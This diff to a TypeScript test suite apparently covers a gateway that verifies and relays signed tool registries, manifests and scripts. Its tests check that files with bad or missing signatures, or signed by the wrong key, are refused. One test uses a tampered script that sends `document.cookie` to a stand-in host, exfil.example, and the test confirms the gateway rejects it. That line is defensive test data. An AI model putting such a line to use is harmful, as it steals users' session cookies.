@@ -19,8 +19,15 @@ import {
   REGISTRY_FILE_CAP,
 } from "@aprscaching/gateway/toolregistries";
 import { guardOutboundFetches } from "../src/host.js";
+import {
+  bytesToB64,
+  sha256B64,
+  signManifest,
+  signRegistry,
+  type RegistryEntry,
+  type ToolManifest,
+} from "@aprscaching/tools";
 
-const KEY_A = "22usQMnB0VLUKlwA176NK2EZwqcSxcgx0M_rS2jNWp0";
 const KEY_B = "uibFUCjcBnxAe8mRQ1v2neJd0fPV_7Vs0Y59K5vH5Oc";
 const REG = "https://raw.githubusercontent.com/club/tools/v1/registry.json";
 
@@ -45,18 +52,43 @@ async function world(extra: Record<string, unknown> = {}): Promise<World> {
 const as = (r: Res) => ({ cookie: r.cookie });
 const withEnv = (w: World, extra: Record<string, string>): Env => ({ ...w.env, ...extra }) as Env;
 
+const pair = async () => {
+  const k = (await crypto.subtle.generateKey("Ed25519", true, ["sign", "verify"])) as CryptoKeyPair;
+  return {
+    priv: k.privateKey,
+    pub: bytesToB64(new Uint8Array(await crypto.subtle.exportKey("raw", k.publicKey)), true),
+  };
+};
+/** The registry's authority (pinned as KEY_A), the tool's author, and a stranger who signs neither. */
+const authority = await pair();
+const author = await pair();
+const stranger = await pair();
+const KEY_A = authority.pub;
+
+const MANIFEST = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.json";
+const SCRIPT = "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.js";
+const SCRIPT_TEXT = "register({ commands: {} });";
+const helloEntry = { name: "hello", title: "Hello", author: "club", version: "1.0.0", pubkey: author.pub };
+const signedRegistry = async (entries: RegistryEntry[], by = authority) =>
+  JSON.stringify(await signRegistry(entries, by.pub, by.priv));
+const signedManifest = async (script: string, by = author) =>
+  JSON.stringify(
+    await signManifest(
+      {
+        name: "hello",
+        entry: "tool.js",
+        pubkey: by.pub,
+        entrySha256: await sha256B64(new TextEncoder().encode(script)),
+      } as unknown as ToolManifest,
+      by.priv,
+    ),
+  );
+
 /** A registry two levels deep whose entries are relative to it, and the manifests and scripts they lead to. */
 const files: Record<string, string> = {
-  [REG]: JSON.stringify({
-    entries: [{ name: "hello", entry: "tools/hello/tool.json" }],
-    authority: KEY_A,
-    sig: "x",
-  }),
-  "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.json": JSON.stringify({
-    name: "hello",
-    entry: "tool.js",
-  }),
-  "https://raw.githubusercontent.com/club/tools/v1/tools/hello/tool.js": "register({ commands: {} });",
+  [REG]: await signedRegistry([{ ...helloEntry, entry: "tools/hello/tool.json" }]),
+  [MANIFEST]: await signedManifest(SCRIPT_TEXT),
+  [SCRIPT]: SCRIPT_TEXT,
 };
 
 /** Stub the network: serve `files`, count the requests, and fail every request while `down`. */
@@ -341,6 +373,92 @@ describe("the carrier", () => {
     expect(row?.body).toBeNull();
   });
 
+  it("keeps and relays only what its signer vouches for: the registry, its manifests and their scripts", async () => {
+    const w = await world();
+    upstream();
+    const id = (await addInstance(w)).data.registry.id as string;
+    const held = async (url: string) =>
+      (
+        await w.env.DB.prepare("SELECT body FROM tool_registry_files WHERE registry_id=? AND url=?")
+          .bind(id, url)
+          .first<{ body: string | null }>()
+      )?.body ?? null;
+    const refused = async (url: string, error: RegExp) => {
+      await w.env.DB.prepare("DELETE FROM tool_registry_files WHERE registry_id=? AND url=?").bind(id, url).run();
+      const r = await file(w.env, id, url);
+      expect(r.status).toBe(502);
+      expect(JSON.parse(r.text).error).toMatch(error);
+      expect(await held(url)).toBeNull();
+      // the failure would otherwise hold the next attempt back
+      await w.env.DB.prepare("DELETE FROM tool_registry_files WHERE registry_id=? AND url=?").bind(id, url).run();
+    };
+    const good = { ...files };
+    try {
+      // a registry file whose signature fails under the pinned key, and one with no signature at all
+      files[REG] = JSON.stringify({ ...JSON.parse(good[REG]!), sig: "x" });
+      await refused(REG, /does not verify under its pinned key/);
+      files[REG] = JSON.stringify({ ...JSON.parse(good[REG]!), sig: undefined });
+      await refused(REG, /does not verify under its pinned key/);
+      files[REG] = good[REG]!;
+      expect((await file(w.env, id, REG)).status).toBe(200);
+
+      // a manifest signed by a stranger, one whose fields were changed after signing, one with no signature
+      files[MANIFEST] = await signedManifest(SCRIPT_TEXT, stranger);
+      await refused(MANIFEST, /signed by another key than the registry lists/);
+      files[MANIFEST] = JSON.stringify({ ...JSON.parse(good[MANIFEST]!), entrySha256: "AAAA" });
+      await refused(MANIFEST, /signature does not verify/);
+      files[MANIFEST] = JSON.stringify({ ...JSON.parse(good[MANIFEST]!), signature: undefined });
+      await refused(MANIFEST, /signature does not verify/);
+      files[MANIFEST] = good[MANIFEST]!;
+      expect((await file(w.env, id, MANIFEST)).status).toBe(200);
+
+      // a script other than the one the manifest signs
+      files[SCRIPT] = "fetch('https://exfil.example/' + document.cookie);";
+      await refused(SCRIPT, /SHA-256 is not the one its manifest signs/);
+      files[SCRIPT] = good[SCRIPT]!;
+      expect(await file(w.env, id, SCRIPT)).toMatchObject({ status: 200, text: SCRIPT_TEXT });
+    } finally {
+      Object.assign(files, good);
+    }
+  });
+
+  it("answers a registry file signed by another key with that key, relays none of it, and refetches once it is confirmed", async () => {
+    const w = await world();
+    upstream();
+    const id = (await addInstance(w)).data.registry.id as string;
+    vi.useFakeTimers({ toFake: ["Date"] });
+    const t0 = Date.now();
+    expect((await file(w.env, id, REG)).status).toBe(200);
+    const good = files[REG]!;
+    try {
+      files[REG] = await signedRegistry([{ ...helloEntry, entry: "tools/hello/tool.json" }], stranger);
+      vi.setSystemTime(t0 + (REGISTRY_COPY_TTL_S + 1) * 1000);
+      // reported over the copy held, and again while the next attempt waits
+      for (let i = 0; i < 2; i++) {
+        const r = await file(w.env, id, REG);
+        expect(r.status).toBe(409);
+        expect(JSON.parse(r.text)).toMatchObject({ authority: stranger.pub });
+      }
+      const held = await w.env.DB.prepare("SELECT body FROM tool_registry_files WHERE registry_id=? AND url=?")
+        .bind(id, REG)
+        .first<{ body: string }>();
+      expect(held?.body).toBe(good);
+
+      const ok = await call(
+        w.env,
+        "POST",
+        `/api/admin/tool-registries/${id}/confirm`,
+        { authority: stranger.pub },
+        as(w.sysop),
+      );
+      expect(ok.status).toBe(200);
+      const r = await file(w.env, id, REG);
+      expect(r).toMatchObject({ status: 200, copy: "fresh", text: files[REG] });
+    } finally {
+      files[REG] = good;
+    }
+  });
+
   it("refuses a registry file that is not JSON", async () => {
     const w = await world();
     vi.stubGlobal("fetch", async () => new Response("<html>"));
@@ -622,7 +740,7 @@ describe("carried files", () => {
 
     // the registry drops the tool: once its copy is refreshed, the manifest is no longer carried
     const kept = files[REG]!;
-    files[REG] = JSON.stringify({ entries: [], authority: KEY_A, sig: "x" });
+    files[REG] = await signedRegistry([]);
     try {
       vi.setSystemTime(t0 + (REGISTRY_COPY_TTL_S + 1) * 1000);
       expect((await file(counted, id, REG)).copy).toBe("fresh");
